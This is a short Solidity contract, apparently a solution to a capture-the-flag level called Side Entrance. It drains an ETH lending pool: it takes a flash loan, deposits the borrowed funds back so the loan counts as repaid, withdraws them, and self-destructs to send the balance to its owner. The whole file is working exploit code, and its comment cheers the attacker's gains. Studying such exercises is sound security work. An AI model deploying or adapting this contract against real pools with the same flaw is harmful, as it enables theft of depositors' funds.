pragma solidity ^0.8.0;

interface PoolContract {
	function deposit() external payable;
	function withdraw() external;
    function flashLoan(uint256 amount) external;
}

/**
 * The SideEntranceExploit contract calls the 'flashLoan' function, deposit the amount back into the pool to be able to withdraw it.
 * The attacker can then empty this contract balance to fully enjoy his/her hard earned ETH :)
 */
contract SideEntranceExploit {
	address pool;
	address payable owner;

	constructor(address payable _owner, address _pool) {
		owner = _owner;
		pool = _pool;
	}

	function exploit(uint256 _amount) external {
		require(msg.sender == owner);
		PoolContract(pool).flashLoan(_amount);
		withdrawFromPool();
	}

    function execute() external payable {
    	PoolContract(pool).deposit{value: msg.value}();
    }

    function withdrawFromPool() private {
    	PoolContract(pool).withdraw();
    }

    function sweep() external {
    	require(msg.sender == owner);
    	selfdestruct(owner);
    }

    receive() external payable {}
}
